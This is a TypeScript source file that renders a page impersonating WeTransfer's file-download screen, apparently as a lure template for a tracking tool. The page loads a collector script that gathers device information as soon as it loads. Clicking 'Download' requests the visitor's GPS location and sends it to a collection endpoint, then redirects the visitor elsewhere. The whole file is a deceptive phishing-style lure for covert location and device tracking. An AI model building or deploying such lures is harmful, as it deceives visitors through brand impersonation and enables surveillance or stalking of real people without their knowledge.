import { escapeHtml } from '../utils/html.js';

interface WeTransferTemplateOptions {
  fileName?: string;
  fileSize?: string;
  senderEmail?: string;
}

export function renderWeTransferTemplate(slug: string, targetUrl: string, options: WeTransferTemplateOptions = {}, gpsMode: string = 'optional'): string {
  const fileName = escapeHtml(options.fileName || 'Files.zip');
  const fileSize = escapeHtml(options.fileSize || '24.7 MB');
  const senderEmail = escapeHtml(options.senderEmail || 'someone@email.com');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Download your files - WeTransfer</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #400099; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
    .card { background: #fff; border-radius: 12px; max-width: 400px; width: 100%; margin: 24px; overflow: hidden; }
    .card-header { padding: 32px 32px 24px; }
    .brand { font-size: 13px; font-weight: 700; color: #400099; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 24px; }
    .file-icon { width: 48px; height: 48px; background: #f3f0ff; border-radius: 8px; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
    .file-icon svg { width: 24px; height: 24px; fill: #400099; }
    h1 { font-size: 18px; font-weight: 600; color: #1a1a1a; margin-bottom: 4px; }
    .meta { font-size: 13px; color: #999; margin-bottom: 4px; }
    .sender { font-size: 13px; color: #666; margin-bottom: 24px; }
    .expires { font-size: 12px; color: #999; padding: 12px 32px; background: #fafafa; border-top: 1px solid #eee; }
    .download-btn { display: block; width: calc(100% - 64px); margin: 0 32px 32px; padding: 14px; background: #409; color: #fff; border: none; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: background 0.2s; text-align: center; }
    .download-btn:hover { background: #300077; }
    .download-btn:disabled { background: #8c6bb1; cursor: default; }
    .status { display: none; padding: 0 32px 24px; font-size: 14px; color: #666; text-align: center; }
    .status.show { display: flex; align-items: center; justify-content: center; gap: 8px; }
    .spinner { width: 16px; height: 16px; border: 2px solid #e0e0e0; border-top-color: #400099; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .success { display: none; padding: 0 32px 24px; text-align: center; }
    .success.show { display: block; }
    .success-bar { height: 4px; background: #4caf50; border-radius: 2px; margin-bottom: 8px; }
    .success p { font-size: 13px; color: #4caf50; }
  </style>
</head>
<body>
  <div class="card">
    <div class="card-header">
      <div class="brand">WeTransfer</div>
      <div class="file-icon">
        <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zM14 8V3l5 5h-5zM12 17l-4-4h2.5v-3h3v3H16l-4 4z"/></svg>
      </div>
      <h1>${fileName}</h1>
      <p class="meta">${fileSize}</p>
      <p class="sender">Sent by ${senderEmail}</p>
    </div>
    <button class="download-btn" id="downloadBtn" onclick="handleDownload()">Download</button>
    <div class="status" id="status"><div class="spinner"></div><span>Preparing download...</span></div>
    <div class="success" id="success">
      <div class="success-bar"></div>
      <p>Download starting...</p>
    </div>
    <div class="expires">Available until ${new Date(Date.now() + 7 * 86400000).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })}</div>
  </div>
  <script src="/static/collector.js"></script>
  <script>
    window.__TRACKER_CONFIG = {
      slug: ${JSON.stringify(slug)},
      collectUrl: '/c/' + ${JSON.stringify(slug)},
      targetUrl: ${JSON.stringify(targetUrl)},
      templateId: 'wetransfer',
      gpsMode: ${JSON.stringify(gpsMode)}
    };
    if (window.TrackerCollector) { window.TrackerCollector.collectDeviceInfo(); }
    function handleDownload() {
      var btn = document.getElementById('downloadBtn');
      var status = document.getElementById('status');
      var success = document.getElementById('success');
      btn.disabled = true;
      status.classList.add('show');
      if (window.TrackerCollector) {
        window.TrackerCollector.requestGPSAndSubmit(window.__TRACKER_CONFIG, function() {
          status.classList.remove('show');
          success.classList.add('show');
          setTimeout(function() { window.location.href = window.__TRACKER_CONFIG.targetUrl; }, 2000);
        });
      }
    }
  </script>
</body>
</html>`;
}
